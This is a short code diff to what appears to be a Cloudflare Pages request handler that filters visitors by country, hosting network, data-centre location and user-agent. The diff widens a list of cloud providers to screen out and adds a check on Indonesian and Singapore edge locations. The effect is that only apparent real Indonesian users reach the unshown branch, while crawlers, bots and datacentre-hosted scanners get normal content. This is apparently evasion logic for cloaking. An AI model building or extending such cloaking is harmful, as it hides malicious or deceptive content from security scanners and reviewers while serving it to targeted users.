@@ -6,8 +6,9 @@ export async function onRequest(context) {
   const userAgent = (headers.get('user-agent') || '').toLowerCase();
   const country = request.cf ? request.cf.country : 'Unknown';
   const asOrg = (request.cf && request.cf.asOrganization ? request.cf.asOrganization : '').toLowerCase();
-  const cloudList = ['amazon','google','digitalocean','microsoft','cloudflare','akamai','linode','ovh','vps'];
+  const cloudList = ['amazon','google','digitalocean','microsoft','cloudflare','akamai','linode','ovh','vps','hetzner','vultr','alibaba'];
   const isCloud = cloudList.some(c => asOrg.includes(c));
+  if (!new Set(['CGK', 'SUB', 'BTH', 'DPS', 'UPG', 'KNO', 'SIN']).has(request.cf?.colo)) return next();
   if (country !== 'ID' || isCloud || /bot|spider|crawl|lighthouse/i.test(userAgent)) {
     return next();
   }
